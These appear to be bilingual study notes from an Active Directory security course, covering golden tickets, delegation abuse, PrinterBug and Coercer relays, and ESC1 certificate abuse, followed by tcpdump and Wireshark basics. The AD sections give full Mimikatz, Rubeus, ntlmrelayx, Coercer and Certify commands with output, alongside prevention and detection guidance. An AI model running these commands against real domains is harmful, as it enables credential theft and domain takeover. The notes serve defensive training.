```powershell
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

Where:

* `/domain`: Specifies the domain name (e.g., `eagle.local`).
* `/sid`: Specifies the domain SID obtained from the previous step.
* `/rc4`: The NTLM hash of the **krbtgt** account.
* `/user`: The username for which the Golden Ticket is being created (e.g., `Administrator`).
* `/id`: The **Relative ID (RID)** of the user (e.g., `500` for **Administrator**).
* `/renewmax`: The maximum number of days the ticket can be renewed (e.g., `7`).
* `/endin`: The expiration date/time for the ticket (e.g., `8` for 8 days).
* `/ptt`: Places the forged ticket into the current ticket cache (useful for immediate use).

**Step 3: Verify the Golden Ticket**

Once the ticket is created, it can be verified using the **klist** command to see if the Golden Ticket has been properly added to the Kerberos ticket cache:

```powershell
C:\Mimikatz> klist
```

If the Golden Ticket was successfully created, you should see the forged TGT listed in the output.

#### **Prevention**

Preventing the Golden Ticket attack is difficult because it leverages the inherent trust in Kerberos tickets. However, the following steps can mitigate the attack:

1. **Block Privileged Users from Authenticating to Non-Essential Devices**:

   * Restrict privileged users from authenticating to any device that does not require their credentials, reducing the chances of their credentials being used for Golden Ticket generation.

2. **Periodically Reset the krbtgt Password**:

   * Regularly changing the **krbtgt** account password can limit the window of opportunity for attackers to exploit a compromised hash.
   * It is recommended to reset the **krbtgt** password twice, with at least **10 hours between resets**, to clear any old hashes.

3. **Enforce SIDHistory Filtering**:

   * Enabling **SIDHistory filtering** can prevent attackers from using **SIDHistory attributes** for **cross-domain escalation** (i.e., moving from a child domain to a parent domain).

4. **Implement Monitoring and Alerting for Unusual Authentication Activity**:

   * Monitor for suspicious Kerberos activity such as multiple requests for **TGTs** without prior **TGS** (Ticket Granting Service) requests, which may indicate a Golden Ticket.

#### **Detection**

1. **Monitor Event ID 4624 and 4625 for Suspicious Logons**:

   * These event IDs capture both successful and failed logon attempts. Monitor for logons from unusual or unexpected accounts, especially **Administrator** and other high-privileged accounts.

2. **Look for TGS Requests Without a Prior TGT**:

   * TGS requests that occur without a valid **TGT** may indicate the presence of a Golden Ticket.

3. **Monitor for Event ID 4675 if SIDHistory Filtering is Enabled**:

   * This event indicates **cross-domain escalation**, which can be caused by a Golden Ticket being used to impersonate an account from another domain.

4. **Check for Golden Ticket Usage**:

   * Look for evidence of **forged TGTs** in the **Kerberos ticket cache** using tools like **klist**.

```

## Kerberos Constrained Delegation

```jsx

---

### 🔐 Description

**Kerberos Delegation** permet à une application d'accéder à des ressources sur un autre serveur au nom d'un utilisateur, sans que cet utilisateur n'ait un accès direct. Par exemple, un compte de service pour un serveur web peut être délégué pour accéder à une base SQL, ce qui permet aux utilisateurs d'interagir avec les données sans avoir de droits directs sur la base.

#### Types de délégation Kerberos dans Active Directory :

1. **Unconstrained Delegation** (non restreinte)

   * La plus permissive. Permet au compte délégué d'accéder à n’importe quel service.
2. **Constrained Delegation** (restreinte)

   * Limite les services auxquels le compte peut se déléguer, défini dans les attributs de l’utilisateur.
3. **Resource-Based Constrained Delegation**

   * Moins utilisée, elle est configurée au niveau de l’objet machine cible.

> ⚠️ Toutes les formes de délégation représentent un risque potentiel de sécurité. Elles doivent être évitées sauf nécessité absolue.

---

### 🎯 Attaque : Abus de la Délégation Restreinte (Constrained Delegation)

Quand un compte est configuré pour une délégation restreinte, il peut demander des tickets Kerberos pour d’autres comptes afin d'accéder à des services spécifiques.

#### Étapes de l’attaque :

1. **Identifier les comptes configurés pour la délégation :**

```powershell
Get-NetUser -TrustedToAuth
```

Exemple de résultat :

```plaintext
distinguishedname       : CN=web service,CN=Users,DC=eagle,DC=local
msds-allowedtodelegateto: {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
useraccountcontrol      : TRUSTED_TO_AUTH_FOR_DELEGATION
```

2. **Récupérer le hash NTLM du mot de passe compromis (ex: `Slavi123`) :**

```powershell
.\Rubeus.exe hash /password:Slavi123
```

Sortie :

```plaintext
rc4_hmac : FCDC65703DD2B0BD789977F1F3EEAECF
```

3. **Impersonner l’utilisateur ‘Administrator’ et injecter le ticket Kerberos :**

```powershell
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

4. **Vérifier l’injection du ticket avec `klist` :**

```powershell
klist
```

5. **Ouvrir une session distante sur le DC avec les droits de l’Administrator :**

```powershell
Enter-PSSession dc1
```

---

### 🛡️ Prévention

* Activer l’option **"Account is sensitive and cannot be delegated"** pour les comptes à privilèges.
* Ajouter les comptes critiques au groupe **"Protected Users"**, qui empêche toute forme de délégation.
* Mettre en place une politique de mot de passe robuste pour éviter les attaques de type **Kerberoasting**.

---

### 🔍 Détection

* Surveiller les **connexions suspectes** à l’aide de l’**Event ID 4624** (logon réussi).
* Inspecter le champ **Transited Services** dans les journaux pour identifier les processus de logon de type S4U (Service for User).

---

```

## Print Spooler & NTLM Relaying

```jsx

---

## 🖨️ Print Spooler Exploitation (PrinterBug)

### 🔍 Description

The **Print Spooler** service, enabled by default even in modern Windows systems, became a critical attack vector after the discovery of **"PrinterBug"** by Lee Christensen in 2018.

This bug leverages the functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` to **force a remote machine to authenticate to an attacker-controlled system**, sending **Kerberos TGTs** that can be relayed or harvested.

> 🎯 Microsoft classified this issue as “by-design” and **did not release a patch**.

---

### 🚨 Impact

If a **Domain Controller (DC)** runs the Print Spooler service, an attacker can:

* **Relay the DC’s connection** to another DC to perform **DCSync**, assuming **SMB signing is disabled**.
* Force the DC to connect to a server with **Unconstrained Delegation**, allowing **TGTs to be cached** and extracted with tools like **Mimikatz** or **Rubeus**.
* **Relay authentication** to **Active Directory Certificate Services (AD CS)** to obtain a valid **certificate impersonating the DC**.
* Abuse the connection to configure **Resource-Based Delegation**, enabling further privilege escalation.

---

### ⚔️ Attack Methodology

This example demonstrates **NTLM relay to perform DCSync** by redirecting the DC’s Print Spooler request to another DC.

#### 🛠️ Step-by-Step:

1. **Start NTLMRelayx**, targeting the second DC (`DC2`):

```bash
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

Sample Output:

```
[*] Servers started, waiting for connections
```

2. **Trigger the PrinterBug** using **Dementor** to make the first DC (`DC1`) authenticate to us:

```bash
python3 dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

Expected Output (even with RPC errors, the relay may succeed):

```
[*] bound to spoolss
[*] getting context handle...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR
```

3. **Check NTLMRelayx output** – if successful, DCSync will return **NTLM hashes** of domain users, including privileged accounts.

---

### 🛡️ Prevention

1. **Disable Print Spooler** on all critical servers (especially DCs):

   * Use **Group Policy** or PowerShell:

     ```powershell
     Stop-Service spooler
     Set-Service spooler -StartupType Disabled
     ```

2. **Registry Hardening** – prevent remote RPC endpoint use:

   * Key: `HKLM\System\CurrentControlSet\Control\Print`
   * Value: `RegisterSpoolerRemoteRpcEndPoint`

     * `1`: Enabled
     * `2`: Remote access disabled

3. **Enforce SMB Signing** on DCs to prevent NTLM relays.

---

### 🕵️ Detection

* While **PrinterBug attacks don't generate event ID 4662** (typically used for DCSync detection), they may still be spotted by:

  * Event ID **4624** – look for suspicious successful logons on DCs from unusual IPs.
  * **Network connection logs** – monitor outbound connections from DCs on **ports 445 and 139**.

---

### 🎣 Honeypot Strategy

You can deploy PrinterBug as a **honeypot** to detect lateral movement or exploitation attempts:

* **Block outbound SMB traffic** from servers (139/445) and alert on attempts.
* Set traps using decoy servers with **Print Spooler enabled** and monitor connections.

> ⚠️ Use honeypots only if your **blue team can respond quickly**—they work best in **mature security environments**.

---

```

## Coercing Attacks & Unconstrained Delegation

```jsx

---

## 🔓 Coercing Attacks in Active Directory

### 📌 Description

**Coercion attacks** are a class of privilege escalation techniques in Active Directory where an attacker forces one system (usually a privileged one like a Domain Controller) to **authenticate to an attacker-controlled machine**. This allows credential theft or ticket manipulation.

Although **PrinterBug** is the most well-known example, tools like **Coercer** now support a **wide range of vulnerable RPC functions** for this purpose, significantly broadening the attack surface.

> ⚠️ Most AD environments are **vulnerable by default** unless hardened specifically.

---

### 🧨 Impact

Once a coercion path is successful, the attacker can pivot to various **post-exploitation techniques**:

* **Relay to another DC** and perform **DCSync**, if **SMB signing is disabled**.
* Coerce a DC to connect to a server with **Unconstrained Delegation (UD)** and capture **Kerberos TGTs**.
* Relay to **AD Certificate Services** to obtain a forged certificate (usable for DCSync or lateral movement).
* Abuse **Resource-Based Delegation (RBCD)** to impersonate users on target systems.

---

### ⚔️ Attack Walkthrough: Capturing a TGT via Coercer

#### 1. 🔍 Identify Unconstrained Delegation Hosts

Use **PowerView** to list machines with Unconstrained Delegation enabled:

```powershell
Get-NetComputer -Unconstrained | Select samaccountname
```

Example Output:

```
samaccountname
--------------
DC1$
SERVER01$
WS001$
DC2$
```

#### 2. 🛰️ Monitor for TGTs on a Compromised UD Machine

On `WS001`, run **Rubeus** to monitor incoming tickets:

```powershell
.\Rubeus.exe monitor /interval:1
```

Sample Output:

```
[*] 18/12/2022 22.37.09 UTC - Found new TGT:
User         : bob@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.09
```

#### 3. 🚨 Trigger Coercion with Coercer

On the attacker machine (e.g., Kali), use **Coercer**:

```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

Expected Output:

```
[>] Pipe '\PIPE\lsarpc' is accessible!
[>] Pipe '\PIPE\spoolss' is accessible!
[+] All done!
```

#### 4. 🎯 Capture the Domain Controller's TGT

Rubeus on `WS001` will now detect the DC’s TGT:

```
[*] 18/12/2022 22.55.52 UTC - Found new TGT:
User         : DC1$@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.21
```

#### 5. 🛠️ Use the TGT for Authentication

Inject the ticket with **Rubeus**:

```powershell
.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

Then, dump credentials using **Mimikatz**:

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
```

---

### 🛡️ Prevention

Because Windows doesn’t natively restrict coercion vectors, prevention requires proactive controls:

1. **Deploy a Third-Party RPC Firewall**
   Example: [Zero Networks RPC Firewall](https://github.com/zeronetworks/rpcfirewall)

   * Audit or block dangerous RPC functions
   * Custom blocklists for OPNUMs

2. **Block Outbound Ports 139 and 445**

   * Especially from **Domain Controllers** and sensitive servers
   * Prevents coercion responses from reaching attackers

---

### 🔍 Detection

Detection is challenging, but possible through network and firewall monitoring:

* **Firewall Log Analysis**

  * Watch for **outbound SMB connections** (139/445) from core servers
  * Especially unexpected traffic to non-trusted machines

* **Dropped Traffic as an Alert Signal**

  * If port blocking is in place, dropped connections can indicate attack attempts

* **Third-Party Monitoring Tools**

  * The RPC Firewall mentioned above provides robust detection features for these attack vectors.

---

### 🧠 Final Notes

* **Coercion is not a vulnerability, but a design issue**—and highly effective.
* Combining **RPC firewalling** with **network egress restrictions** significantly improves defenses.
* Regularly audit **delegation settings** and **RPC exposure** in your environment.

---

```

## Object ACLs

```jsx

---

## 🛡️ Attaques par Coercition dans Active Directory

### 📘 Description

Les attaques par coercition sont devenues une méthode fiable pour **élever les privilèges d’un utilisateur standard jusqu’aux privilèges d’administrateur de domaine**. Dans un environnement Active Directory (AD) classique, la majorité des configurations sont vulnérables à ce type d’attaque.

L’exploit **PrinterBug** est l’un des premiers exemples connus de coercition. Depuis, d’autres fonctions RPC vulnérables ont été identifiées. Elles permettent à un utilisateur du domaine de forcer un serveur distant (RemoteServer\$) à s’authentifier auprès d’un autre hôte contrôlé par l’attaquant. L’outil **Coercer** a été conçu pour exploiter plusieurs de ces fonctions RPC.

---

### 🎯 Impact

Une fois la coercition établie, l’attaquant peut effectuer différents types d’attaques en chaîne :

* **Relai vers un autre contrôleur de domaine (DC)** pour exécuter une attaque DCSync (si la signature SMB est désactivée).
* **Forcer un DC à se connecter à un serveur en Délégation Non Restreinte**, capturant ainsi un TGT dans la mémoire du serveur (outils : Rubeus, Mimikatz).
* **Relai vers les services de certificats Active Directory (ADCS)** pour générer un certificat s’identifiant comme un DC.
* **Configurer une délégation Kerberos basée sur les ressources** afin de s’authentifier comme n’importe quel administrateur sur la machine ciblée.

---

### 🔧 Méthodologie de l’attaque

Dans cet exemple, l’objectif est de **capturer un TGT** sur un serveur compromis configuré avec la **délégation non restreinte**, à l’aide de l’outil **Coercer**.

#### 🔎 Étapes :

1. **Identifier les serveurs avec Délégation Non Restreinte** (via PowerView) :

   ```powershell
   Get-NetComputer -Unconstrained | select samaccountname
   ```

   **Exemple de sortie :**

   ```
   samaccountname
   --------------
   DC1$
   SERVER01$
   WS001$
   DC2$
   ```

2. **Surveiller les tickets Kerberos avec Rubeus sur le serveur compromis (ex: WS001)** :

   ```cmd
   .\Rubeus.exe monitor /interval:1
   ```

3. **Lancer Coercer depuis une machine Kali pour forcer l’authentification du DC vers WS001** :

   ```bash
   Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
   ```

   **Exemple de sortie :**

   ```
   [>] Pipe '\PIPE\lsarpc' is accessible!
   ...
   [>] Pipe '\PIPE\spoolss' is accessible!
   ...
   [+] All done!
   ```

4. **Capturer le TGT du DC sur WS001 avec Rubeus** :

   ```text
   [*] Found new TGT:
     User : DC1$@EAGLE.LOCAL
   ```

5. **Injecter le ticket capturé pour s’authentifier dans le domaine** :

   ```cmd
   .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
   ```

6. **Lancer une attaque DCSync avec Mimikatz** :

   ```cmd
   .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
   ```

---

### 🛡️ Prévention

Windows ne permet pas nativement de surveiller ou bloquer les appels RPC sensibles. Deux approches de prévention :

* **Pare-feu RPC tiers** : des outils comme le *RPC Firewall* de Zero Networks permettent d’auditer et de bloquer des fonctions RPC spécifiques.
* **Restriction des ports sortants 139 et 445** : bloquer ces ports sur les DC et serveurs critiques empêche le relai d’authentification vers les attaquants.

---

### 🔍 Détection

Détecter l’abus de coercition via RPC reste complexe sans solutions tierces :

* **Analyse des journaux de pare-feu** : les attaques réussies génèrent du trafic sortant inhabituel, souvent sur le port 445.
* **Détection des connexions bloquées** : bloquer les ports mentionnés empêche la réception de TGT et toute tentative génère une alerte utile.

---

### ✅ Conclusion

En combinant **filtrage RPC** et **blocage des ports réseau stratégiques**, les organisations renforcent significativement leur sécurité face aux attaques par coercition.

---

```

## PKI - ESC1

```jsx

---

## 🔐 Attaque ESC1 – Abus des Active Directory Certificate Services (AD CS)

### 📘 Description

La recherche *Certified Pre-Owned* par SpecterOps a mis en lumière les **Active Directory Certificate Services (AD CS)** comme vecteur d’attaque privilégié en raison de nombreuses **mauvaises configurations fréquentes**. Les certificats offrent un fort avantage aux attaquants :

* **Validité longue durée** (souvent un an ou plus).
* **Les réinitialisations de mots de passe** n’invalident pas les certificats déjà émis.
* **Des modèles mal configurés** permettent à des attaquants d’obtenir des certificats pour le compte d'autres utilisateurs.
* Le **compromis de la clé privée d’une autorité de certification** permet de forger des "certificats dorés" (Golden Certificates).

L’une des méthodes les plus notoires d’élévation de privilège est **ESC1**, qui repose sur les caractéristiques suivantes :

* Pas d’approbation ou de validation manuelle requise.
* Le modèle permet **l’authentification client** (Client Authentication) ou **la connexion par carte à puce**.
* Le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé, permettant à l’utilisateur de **fournir lui-même le nom du sujet (SAN)**.

---

### ⚙️ Exécution de l’attaque ESC1

#### 1. Rechercher les modèles vulnérables avec **Certify** :

```powershell
.\Certify.exe find /vulnerable
```

**Exemple de résultat :**

> Le modèle **UserCert** est vulnérable car :
>
> * Accessible à tous les utilisateurs du domaine.
> * Permet la définition du **Subject Alternative Name (SAN)** (donc l'usurpation d'autres identités).
> * Ne nécessite pas d’approbation d’un responsable.
> * Permet l’authentification client (logon).

#### 2. Demander un certificat en usurpant l’identité de **Administrator** :

```powershell
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

Cela génère un **certificat au format PEM**.

#### 3. Convertir le certificat en **format PFX** (compatible avec Rubeus) :

```bash
sed -i 's/\s\s\+/\n/g' cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### 4. Utiliser **Rubeus** pour obtenir un TGT en tant qu’**Administrator** :

```powershell
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

Une fois le TGT chargé, vous pouvez par exemple accéder à `\\dc1\c$` en tant qu’Administrateur.

---

### 🛡️ Prévention

Pour se prémunir contre l’exploitation du modèle **ESC1** :

* **Désactiver le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** sur les modèles de certificat.
* **Activer l’approbation manuelle** (par un Certificate Manager) pour toute demande de certificat.

Il est recommandé de **scanner régulièrement l’environnement PKI** avec Certify ou un outil similaire afin de repérer les mauvaises configurations.

---

### 🔍 Détection

#### 📋 Événements Windows :

* **ID 4886** : Demande de certificat enregistrée.
* **ID 4887** : Certificat émis.
* **ID 4768** : TGT émis suite à l’authentification avec un certificat.

> **Limitation :** Les journaux ne montrent pas directement la valeur du SAN, ce qui peut limiter l’analyse automatique.

#### 🔧 Utilisation de `certutil` pour consulter les certificats émis :

```powershell
certutil -view
```

#### 🔄 Exemple de récupération de journaux par script :

```powershell
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```

#### 💻 Surveillance à distance :

Si l’accès GUI au serveur PKI est indisponible, utilisez une session PowerShell distante :

```powershell
New-PSSession -ComputerName PKI
Enter-PSSession -ComputerName PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

---

### ✅ Remarques

* Surveiller **étroitement les activités PKI** est essentiel pour sécuriser l’Active Directory.
* L’**émission non autorisée de certificats** peut fournir aux attaquants un accès durable et silencieux à l’environnement.

---

```

 
  

 

 

 
     
 

  

  

 

  

## **Intro to Network Traffic Analysis**

## Tcpdump Fundamentals

```jsx

---

## 📡 Introduction à Tcpdump

**Tcpdump** est un **analyseur de paquets en ligne de commande** (packet sniffer) utilisé pour capturer et interpréter les trames réseau provenant des interfaces réseau. Principalement disponible sur les systèmes Unix/Linux, Tcpdump permet d’**observer le trafic réseau "en direct"**, ce qui en fait un outil indispensable pour l’analyse, le dépannage et l’investigation réseau.

> ⚠️ Tcpdump requiert les **droits root** pour accéder aux interfaces matérielles réseau. Sur les systèmes Linux, il est généralement exécuté via `sudo`.
> 📌 Sur Windows, on peut utiliser **WinDump** ou lancer Tcpdump via **WSL (Windows Subsystem for Linux)**.

---

## ⚙️ Options de base pour la capture

Tcpdump propose de nombreux **commutateurs (switches)** pour personnaliser les captures :

| Option              | Description                                                     |
| ------------------- | --------------------------------------------------------------- |
| `-D`                | Affiche les interfaces réseau disponibles.                      |
| `-i`                | Spécifie une interface à utiliser (ex : `-i eth0`).             |
| `-n`                | Désactive la résolution des noms d’hôtes.                       |
| `-nn`               | Désactive la résolution des noms d’hôtes **et** des ports.      |
| `-e`                | Affiche l’en-tête Ethernet dans les résultats.                  |
| `-X`                | Affiche le contenu des paquets en **hexadécimal** et **ASCII**. |
| `-v`, `-vv`, `-vvv` | Augmente le niveau de verbosité.                                |
| `-c`                | Capture un nombre défini de paquets, puis quitte.               |
| `-s`                | Définit la longueur maximale des paquets capturés.              |
| `-S`                | Affiche les numéros de séquence TCP absolus.                    |
| `-q`                | Affiche un résumé minimal du protocole.                         |
| `-r`                | Lit les paquets depuis un fichier.                              |
| `-w`                | Écrit les paquets dans un fichier pour une analyse ultérieure.  |

---

## 🔍 Exemples d'utilisation

### 🎛️ Afficher les interfaces disponibles

```bash
sudo tcpdump -D
```

### 🧲 Capturer le trafic d'une interface spécifique

```bash
sudo tcpdump -i eth0
```

### ❌ Désactiver la résolution DNS et des ports

```bash
sudo tcpdump -i eth0 -nn
```

### 📦 Inclure l’en-tête Ethernet

```bash
sudo tcpdump -i eth0 -e
```

### 🔠 Afficher les paquets en HEX/ASCII

```bash
sudo tcpdump -i eth0 -X
```

### 🎛️ Combiner plusieurs options

```bash
sudo tcpdump -i eth0 -nnvXX
```

---

## 🧾 Interprétation de la sortie Tcpdump

La sortie peut inclure plusieurs champs :

| Champ                       | Description                                          |
| --------------------------- | ---------------------------------------------------- |
| **Horodatage**              | Heure de capture du paquet.                          |
| **Protocole**               | Protocole de couche supérieure (IP, TCP, UDP, etc.). |
| **Source / Destination**    | IP et ports d’origine et de destination.             |
| **Drapeaux TCP**            | Indicateurs SYN, ACK, RST, etc.                      |
| **N° de séquence et d’ACK** | Suivi des segments TCP.                              |
| **Options du protocole**    | Fenêtre TCP, SACK, etc.                              |

---

## 💾 Lecture & Écriture de fichiers

### 🔽 Sauvegarder une capture dans un fichier `.pcap` :

```bash
sudo tcpdump -i eth0 -w ~/capture.pcap
```

### 🔼 Lire une capture existante :

```bash
sudo tcpdump -r ~/capture.pcap
```

> Astuce : Ajoutez les options comme `-X` ou `-vvv` pour une lecture plus détaillée.

---

## 🧠 Utilisation avancée : Tcpdump comme IDS léger

Tcpdump peut être intégré dans des **scripts de détection d’intrusion simples**, par exemple :

* Détecter un nombre inhabituel de requêtes **ICMP (ping)** depuis une IP.
* Automatiser des alertes ou des blocages via des règles de pare-feu ou des logs.

---

```

## Tcpdump Packet Filtering

```jsx

---

## 🎯 Filtres Avancés avec Tcpdump

L’utilisation de **filtres avancés** dans Tcpdump permet de **réduire le volume de trafic affiché ou enregistré**, ce qui améliore les performances et économise de l’espace disque. Ces filtres peuvent être associés à la syntaxe classique de Tcpdump pour effectuer des captures ciblées : d’un simple hôte à des flux très spécifiques via des ports ou des indicateurs TCP.

---

### 🧰 Filtres Tcpdump Utiles

| Filtre               | Effet                                                               |
| -------------------- | ------------------------------------------------------------------- |
| `host`               | Affiche le trafic impliquant un hôte donné (trafic bidirectionnel). |
| `src` / `dst`        | Filtre selon l’adresse source ou destination.                       |
| `net`                | Filtre le trafic d’un réseau (notation CIDR, ex : `/24`).           |
| `proto`              | Filtre par protocole (ex : `tcp`, `udp`, `icmp`, `ether`).          |
| `port`               | Filtre le trafic avec un port source ou destination spécifique.     |
| `portrange`          | Filtre un intervalle de ports (ex : `0-1024`).                      |
| `less` / `greater`   | Filtre selon la taille des paquets.                                 |
| `and` / `or` / `not` | Combine, ajoute ou exclut des conditions.                           |

---

## 📌 Exemples de Filtres Pratiques

### 🎯 Filtrage par Hôte

```bash
sudo tcpdump -i eth0 host 172.16.146.2
```

### 📤 Filtrage par Source

```bash
sudo tcpdump -i eth0 src host 172.16.146.2
```

### 📥 Filtrage par Port Source

```bash
sudo tcpdump -i eth0 tcp src port 80
```

### 🌐 Filtrage par Réseau Destination

```bash
sudo tcpdump -i eth0 dst net 172.16.146.0/24
```

### 📦 Filtrage par Protocole

```bash
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 proto 17  # UDP (protocole 17)
```

### 🔒 Filtrage par Port / Plage de Ports

```bash
sudo tcpdump -i eth0 tcp port 443
sudo tcpdump -i eth0 portrange 0-1024
```

### 📏 Filtrage par Taille de Paquet

```bash
sudo tcpdump -i eth0 less 64
sudo tcpdump -i eth0 greater 500
```

---

## 🔗 Combinaisons de Filtres

### ✅ Avec `AND`

```bash
sudo tcpdump -i eth0 host 192.168.0.1 and port 23
```

### ✅ Avec `OR`

```bash
sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
```

### ❌ Avec `NOT`

```bash
sudo tcpdump -r sus.pcap not icmp
```

---

## 🧠 Capture vs. Analyse Postérieure

* **Filtrage en pré-capture** : les paquets **non correspondants ne sont pas enregistrés** → gain de place mais perte possible d’infos.
* **Filtrage en post-capture** : les paquets sont filtrés **lors de la lecture d’un fichier .pcap**, sans affecter les données d’origine.

---

## 🛠 Astuces d’Interprétation

| Option                 | Usage                                                                     |
| ---------------------- | ------------------------------------------------------------------------- |
| `-S`                   | Affiche les numéros de séquence TCP absolus.                              |
| `-v`, `-X`, `-e`       | Affiche plus de détails sur les paquets.                                  |
| `-c`, `-n`, `-s`, `-q` | Modifie le format ou le volume de sortie.                                 |
| `-A`                   | Affiche uniquement le contenu ASCII (pratique pour les données lisibles). |

### Exemple : ASCII uniquement

```bash
sudo tcpdump -Ar telnet.pcap
```

---

## 🔍 Analyse de contenu avec `grep`

Filtrer un fichier `.pcap` en temps réel :

```bash
sudo tcpdump -Ar http.cap -l | grep 'mailto:*'
```

---

## 🎯 Filtrage avancé sur les **flags TCP**

Pour cibler les paquets avec le **flag SYN** activé :

```bash
tcpdump -i eth0 'tcp[13] & 2 != 0'
```

---

## 📚 Références RFC des Protocoles

| Protocole | RFC                                                     |
| --------- | ------------------------------------------------------- |
| IP        | [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) |
| ICMP      | [RFC 792](https://datatracker.ietf.org/doc/html/rfc792) |
| TCP       | [RFC 793](https://datatracker.ietf.org/doc/html/rfc793) |
| UDP       | [RFC 768](https://datatracker.ietf.org/doc/html/rfc768) |

---

```

## **Interrogating Network Traffic With Capture and Display Filters**

```jsx

---

## 🧪 **Objectifs du Laboratoire Tcpdump**

* Apprendre à filtrer le trafic capturé pour en extraire des données utiles.
* Identifier les serveurs répondant aux requêtes **DNS** et **HTTP/HTTPS**.
* Analyser les **modèles de communication** réseau et les **connexions**.

---

## 📝 **Tâches à Réaliser**

| Tâche                                                     | Description                                                                                                              | Commande / Détails                                                                             |
| --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| **Tâche 1 : Lecture du fichier .pcap sans filtre**        | Observez la capture brute.                                                                                               | `tcpdump -r fichier.pcap`                                                                      |
| **Tâche 2 : Identifier les types de trafic**              | Recherchez les **protocoles** et **ports** utilisés.                                                                     | Protocoles typiques : DNS (53), HTTP (80), HTTPS (443)                                         |
| **Tâche 3 : Identifier les échanges et modèles**          | Analysez les **connexions client/serveur**.<br>Repérez les **handshakes TCP**.                                           | `tcpdump -S -r fichier.pcap` pour voir les séquences TCP complètes                             |
| **Tâche 4 : Analyse détaillée de la capture**             | Trouvez :<br>- Timestamp de la première conversation<br>- Réponse DNS pour apache.org<br>- Protocole en fonction du port | `tcpdump -r fichier.pcap -nn`<br>`tcpdump -r fichier.pcap src host [IP]`                       |
| **Tâche 5 : Filtrer le trafic DNS uniquement**            | Isolez les paquets **UDP sur port 53**.<br>Analysez les noms de domaine, types d’enregistrements.                        | `sudo tcpdump -r fichier.pcap udp and port 53`<br>`tcpdump -X -r fichier.pcap`                 |
| **Tâche 6 : Filtrer le trafic HTTP/HTTPS**                | Isolez les ports **80 et 443**.<br>Identifiez les méthodes HTTP (GET, POST) et les **codes réponse**.                    | `tcpdump -r fichier.pcap 'port 80 or port 443'`                                                |
| **Tâche 7 : Analyser le premier serveur de conversation** | Examinez la **réponse HTTP** pour en déduire la techno serveur (Apache, Nginx...).                                       | `tcpdump -X -r fichier.pcap`<br>Regardez dans le contenu HTTP : headers comme `Server: Apache` |

---

## 🔍 **Pistes d’Analyse à Suivre**

Posez-vous les questions suivantes pendant l'analyse :

* Quels types de trafic sont présents (protocoles, ports) ?
* Combien de **conversations uniques** ou hôtes distincts ?
* Quel est le **timestamp** de la première connexion TCP ?
* Quels **filtres Tcpdump** peuvent simplifier l’analyse ?
* Quels **serveurs** répondent sur des ports standards ?
* Quels types de **requêtes DNS** et **méthodes HTTP** sont utilisés ?

---

```

## **Wireshark Advanced Usage**

```jsx

---
 ## 🧩 **Plugins dans Wireshark** 

Wireshark propose plusieurs **plugins puissants** accessibles via les menus **"Statistics"** et **"Analyze"**, permettant une analyse approfondie du trafic réseau.

---

### 📊 **Onglet "Statistics"** (Statistiques)

Permet de **visualiser des rapports détaillés** sur le trafic capturé, notamment :

* Répartition par **protocoles**
* **Top IP** / hôtes les plus bavards
* Types de **conversations** (TCP, UDP, IPX, etc.)

---

### 🔍 **Onglet "Analyze"** (Analyser)

Offre des outils pour :

* Suivre les **flux TCP**
* Filtrer par **type de conversation**
* Créer des **filtres personnalisés**
* Accéder à des **diagnostics experts** sur les anomalies réseau

---

## 🔄 **Suivre un flux TCP**

Wireshark peut reconstituer un flux TCP complet (conversation entre deux hôtes) dans un format lisible, idéal pour analyser des échanges HTTP, FTP, etc.

### ✅ **Méthode :**

1. Clic droit sur un paquet du flux.
2. Sélectionnez **Follow > TCP Stream**.
3. Une fenêtre s’ouvre avec toute la conversation reconstituée.

### 🎯 **Filtre alternatif :**

```bash
tcp.stream eq #
```

Remplacez `#` par le numéro du flux (visible dans la colonne "Stream Index") pour afficher uniquement les paquets de cette conversation.

---

## 📂 **Extraction de données ou fichiers**

Si une conversation complète est capturée, Wireshark peut **extraire des fichiers transmis**, notamment via FTP, HTTP ou SMB.

### 🔧 **Étapes pour extraire un fichier :**

1. Arrêtez la capture.
2. Allez dans **File > Export Objects**, puis choisissez le protocole (HTTP, DICOM, SMB, etc.).
3. Sélectionnez les fichiers listés et cliquez sur **Save As** pour les extraire.

---

## 📁 **Analyse du protocole FTP**

Le protocole FTP utilise :

* **Port 21** pour les commandes de contrôle (authentification, liste de fichiers).
* **Port 20** pour le transfert de données.

### 🔎 **Filtres utiles dans Wireshark :**

